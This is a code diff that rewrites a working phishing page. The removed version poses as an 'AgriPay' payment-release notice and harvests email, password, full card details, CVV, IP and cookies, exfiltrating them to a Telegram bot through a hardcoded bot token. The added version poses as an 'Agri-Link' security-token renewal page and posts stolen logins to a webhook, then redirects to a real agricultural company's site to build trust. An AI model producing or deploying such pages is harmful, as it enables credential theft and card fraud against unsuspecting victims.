@@ -3,408 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AgriPay - Payment Release</title>
+    <title>Agri-Link | Security Verification</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-            background: #eef2f5; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        /* Professional, Bureaucratic Aesthetic */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f8; /* Standard enterprise gray */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             color: #333;
         }
-        .container { 
-            background: white; 
-            padding: 30px; 
-            border-radius: 6px; 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.08); 
-            width: 420px; 
-            border-top: 4px solid #0078d4; 
-        }
-        .header { text-align: center; margin-bottom: 20px; }
-        .header h2 { margin: 0; color: #0078d4; font-size: 20px; }
-        .header p { margin: 5px 0 0; color: #666; font-size: 14px; }
-        
-        .details { 
-            background: #f8f9fa; 
-            padding: 15px; 
-            border-radius: 4px; 
-            margin-bottom: 20px; 
-            font-size: 14px; 
-            border: 1px solid #e9ecef;
-        }
-        .row { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .row:last-child { margin-bottom: 0; font-weight: 600; border-top: 1px solid #ddd; padding-top: 8px; }
-        .label { color: #888; }
-        .value { font-weight: 500; }
-        .amount { color: #d9534f; } 
 
-        .btn { 
-            width: 100%; 
-            padding: 14px; 
-            background: #0078d4; 
-            color: white; 
-            border: none; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            font-size: 16px; 
-            font-weight: 600; 
-            transition: background 0.2s, opacity 0.2s;
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border-top: 5px solid #2b6cb0; /* Corporate Blue */
         }
-        .btn:hover:not(:disabled) { background: #005a9e; }
-        .btn:disabled { background: #ccc; cursor: not-allowed; }
 
-        /* Hidden Form */
-        #captureForm { display: none; }
-        .input-group { margin-bottom: 15px; text-align: left; position: relative; }
-        label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 500; color: #444; }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1px solid #ccc; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
-            font-size: 15px; 
-            transition: border-color 0.2s, box-shadow 0.2s;
+        .logo-area {
+            margin-bottom: 20px;
+            text-align: center;
         }
-        input:focus { border-color: #0078d4; outline: none; box-shadow: 0 0 0 2px rgba(0,120,212,0.1); }
-        
-        /* Validation States */
-        input.valid { border-color: #28a745; background-color: #f0fff0; }
-        input.invalid { border-color: #dc3545; background-color: #fff0f0; }
-        
-        /* Brand Icon */
-        .brand-icon {
-            position: absolute;
-            right: 12px;
-            top: 38px;
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2b6cb0;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-sub {
             font-size: 12px;
-            font-weight: bold;
             color: #666;
-            background: #eee;
-            padding: 2px 6px;
-            border-radius: 3px;
-            display: none;
+            margin-top: 5px;
         }
 
-        /* Two-column layout for Expiry and CVV */
-        .row-inputs {
-            display: flex;
-            gap: 10px;
-        }
-        .row-inputs .input-group {
-            flex: 1;
-            margin-bottom: 0;
+        h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #222;
         }
 
-        .loading { 
-            display: none; 
-            text-align: center; 
-            margin-top: 20px; 
-            color: #666; 
+        p.message {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #555;
+            margin-bottom: 25px;
+            border-left: 3px solid #ecc94b; /* Warning Yellow */
+            padding-left: 10px;
+            background: #fffaf0;
+            padding: 10px;
+            border-radius: 0 4px 4px 0;
         }
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid #ccc;
-            border-radius: 50%;
-            border-top-color: #0078d4;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .success { display: none; text-align: center; }
-        .success h3 { color: #28a745; margin-bottom: 10px; }
-        .success p { font-size: 14px; color: #666; }
-        
-        .error-msg {
-            color: #dc3545;
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border 0.3s;
+        }
+
+        input:focus {
+            border-color: #2b6cb0;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2b6cb0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: #2c5282;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
             font-size: 11px;
-            margin-top: 4px;
+            color: #999;
+        }
+
+        /* Loading Spinner */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #2b6cb0;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- STEP 1: THE HOOK -->
-    <div id="hookView">
-        <div class="header">
-            <h2>Payment Notification</h2>
-            <p>Agri-Logistics Portal • Invoice #9921-D</p>
+    <div class="container">
+        <div class="logo-area">
+            <div class="logo-text">Agri-Link</div>
+            <div class="logo-sub">Distributor Supply Portal</div>
         </div>
 
-        <div class="details">
-            <div class="row">
-                <span class="label">Vendor:</span>
-                <span class="value">Global Supply Co.</span>
-            </div>
-            <div class="row">
-                <span class="label">Status:</span>
-                <span class="value" style="color: #d9534f;">Pending Verification</span>
-            </div>
-            <div class="row">
-                <span class="label">Amount:</span>
-                <span class="value amount">$12,450.00</span>
-            </div>
+        <h2>Security Certification Expired</h2>
+        
+        <div class="message">
+            <strong>Attention:</strong> Your distribution account security token has expired. To ensure uninterrupted access to your inventory allocations and pricing tiers, please verify your credentials below.
         </div>
 
-        <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">
-            To receive your payment, please verify your identity and confirm your payment method.
-        </p>
-
-        <button class="btn" onclick="showForm()">Release Payment</button>
-    </div>
-
-    <!-- STEP 2: THE CAPTURE FORM -->
-    <form id="captureForm" onsubmit="submitData(event)">
-        <div class="header">
-            <h2>Verify Identity</h2>
-            <p>Enter your portal credentials and card details.</p>
-        </div>
-
-        <div class="input-group">
-            <label>Email / Employee ID</label>
-            <input type="email" id="email" name="email" placeholder="name@company.com" required>
-        </div>
-
-        <div class="input-group">
-            <label>Portal Password</label>
-            <input type="password" id="password" name="password" placeholder="••••••••" required>
-        </div>
-
-        <div class="input-group">
-            <label>Card Number</label>
-            <input type="text" id="card" name="card" placeholder="1234 5678 9012 3456" required maxlength="19">
-            <span id="brandIcon" class="brand-icon"></span>
-            <div id="cardError" class="error-msg">Please enter a valid card number.</div>
-        </div>
-
-        <!-- New: Expiry and CVV Side-by-Side -->
-        <div class="row-inputs">
+        <form id="loginForm" action="#" method="POST">
             <div class="input-group">
-                <label>Expiration (MM/YY)</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required maxlength="5">
+                <label for="email">Business Email Address</label>
+                <input type="email" id="email" name="email" placeholder="name@company.com" required>
             </div>
+            
             <div class="input-group">
-                <label>CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="4">
+                <label for="password">Portal Password</label>
+                <input type="password" id="password" name="password" required>
             </div>
+
+            <button type="submit" id="submitBtn">Verify & Renew Access</button>
+            
+            <div class="loader" id="loader"></div>
+        </form>
+
+        <div class="footer">
+            &copy; 2024 Agri-Link Supply Chain Solutions. <br>
+            Secure Enterprise Portal v4.2.1
         </div>
-
-        <button type="submit" class="btn" id="submitBtn" disabled style="margin-top: 10px;">Authorize & Release</button>
-    </form>
-
-    <!-- STEP 3: LOADING STATE -->
-    <div class="loading" id="loading">
-        <div class="spinner"></div> Contacting Bank Gateway...
     </div>
 
-    <!-- STEP 4: SUCCESS STATE -->
-    <div class="success" id="successView">
-        <h3>Payment Released!</h3>
-        <p>Your funds will arrive within 24 hours.</p>
-        <p style="margin-top: 15px; font-size: 12px; color: #999;">Redirecting to dashboard...</p>
-    </div>
-</div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-<script>
-    // --- CONFIGURATION ---
-    const TELEGRAM_BOT_TOKEN = '8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ';
-    const TELEGRAM_CHAT_ID = '6479764005';
-    const TARGET_SITE = 'https://agweb.com'; 
+            // UI Feedback
+            btn.style.display = 'none';
+            loader.style.display = 'block';
 
-    // --- CARD VALIDATION LOGIC ---
-    const cardInput = document.getElementById('card');
-    const brandIcon = document.getElementById('brandIcon');
-    const cardError = document.getElementById('cardError');
-    const submitBtn = document.getElementById('submitBtn');
-    const expiryInput = document.getElementById('expiry');
-    const cvvInput = document.getElementById('cvv');
+            // Simulate server processing time (2 seconds)
+            setTimeout(() => {
+                // Send data to your webhook
+                const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // Replace with your Discord/Slack webhook
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                }).catch(err => console.error('Error sending data', err));
 
-    let cardValid = false;
-
-    // Format card number with spaces
-    cardInput.addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-        let formattedValue = '';
-        for (let i = 0; i < value.length; i++) {
-            if (i > 0 && i % 4 === 0) formattedValue += ' ';
-            formattedValue += value[i];
-        }
-        e.target.value = formattedValue;
-        validateCard(value);
-    });
-
-    // Format Expiry
-    expiryInput.addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length >= 2) {
-            value = value.substring(0, 2) + '/' + value.substring(2);
-        }
-        e.target.value = value;
-    });
-
-    // Format CVV (Numbers only)
-    cvvInput.addEventListener('input', function (e) {
-        e.target.value = e.target.value.replace(/\D/g, '');
-    });
-
-    function luhnCheck(val) {
-        if (val.length === 0) return false;
-        let sum = 0;
-        let isEven = false;
-        for (let i = val.length - 1; i >= 0; i--) {
-            let digit = parseInt(val[i], 10);
-            if (isEven) {
-                digit *= 2;
-                if (digit > 9) digit -= 9;
-            }
-            sum += digit;
-            isEven = !isEven;
-        }
-        return (sum % 10) === 0;
-    }
-
-    function validateCard(value) {
-        const digits = value.replace(/\s/g, '');
-        let isValid = false;
-        let brand = '';
-
-        // Brand Detection
-        if (/^4/.test(digits)) {
-            brand = 'VISA';
-            if (digits.length >= 13 && digits.length <= 16 && luhnCheck(digits)) {
-                isValid = true;
-            }
-        } else if (/^5[1-5]/.test(digits)) {
-            brand = 'MC';
-            if (digits.length === 16 && luhnCheck(digits)) {
-                isValid = true;
-            }
-        } else if (/^3[47]/.test(digits)) {
-            brand = 'AMEX';
-            if (digits.length === 15 && luhnCheck(digits)) {
-                isValid = true;
-            }
-        } else if (/^6(?:011|5)/.test(digits)) {
-            brand = 'DISCOVER';
-            if (digits.length === 16 && luhnCheck(digits)) {
-                isValid = true;
-            }
-        } else if (luhnCheck(digits)) {
-            // If it passes Luhn but no brand matched yet
-            if (digits.length >= 13 && digits.length <= 19) {
-                isValid = true;
-                brand = 'CARD';
-            }
-        }
-
-        // UI Feedback
-        if (isValid) {
-            cardInput.classList.remove('invalid');
-            cardInput.classList.add('valid');
-            cardError.style.display = 'none';
-            cardValid = true;
-            submitBtn.disabled = false;
-        } else {
-            cardInput.classList.remove('valid');
-            cardInput.classList.add('invalid');
-            if (digits.length >= 13) {
-                cardError.style.display = 'block';
-            } else {
-                cardError.style.display = 'none';
-            }
-            cardValid = false;
-            submitBtn.disabled = true;
-        }
-
-        // Update Brand Icon
-        if (brand) {
-            brandIcon.style.display = 'block';
-            brandIcon.textContent = brand;
-            brandIcon.style.color = brand === 'VISA' ? '#1a1f71' : (brand === 'MC' ? '#eb001b' : (brand === 'AMEX' ? '#006fcf' : '#ff5f00'));
-        } else {
-            brandIcon.style.display = 'none';
-        }
-    }
-
-    // --- SUBMISSION LOGIC ---
-
-    function showForm() {
-        document.getElementById('hookView').style.display = 'none';
-        document.getElementById('captureForm').style.display = 'block';
-    }
-
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return 'Unknown';
-        }
-    }
-
-    async function sendToTelegram(data) {
-        const message = `
-💰 <b>FULL CARD & CREDENTIALS CAPTURED</b>
-📧 Email: <code>${data.email}</code>
-🔑 Pass: <code>${data.password}</code>
-💳 Card: <code>${data.card}</code>
-📅 Exp: <code>${data.expiry}</code>
-🔒 CVV: <code>${data.cvv}</code>
-🌐 IP: <code>${data.ip}</code>
-🕒 Time: ${new Date().toLocaleString()}
-        `;
-
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+                // Redirect to a legitimate site to build trust
+                window.location.href = "https://www.yara.com"; 
+            }, 2000);
         });
-    }
-
-    async function submitData(e) {
-        e.preventDefault();
-        
-        const btn = e.target.querySelector('button');
-        const loading = document.getElementById('loading');
-        
-        btn.style.display = 'none';
-        loading.style.display = 'block';
-
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const card = document.getElementById('card').value;
-        const expiry = document.getElementById('expiry').value;
-        const cvv = document.getElementById('cvv').value;
-        const ip = await getIP();
-        const cookie = document.cookie || "(No cookies)";
-
-        const data = { email, password, card, expiry, cvv, ip, cookie };
-
-        await sendToTelegram(data);
-
-        document.getElementById('captureForm').style.display = 'none';
-        document.getElementById('loading').style.display = 'none';
-        document.getElementById('successView').style.display = 'block';
-
-        setTimeout(() => {
-            window.location.href = TARGET_SITE;
-        }, 2500);
-    }
-</script>
+    </script>
 
 </body>
 </html>
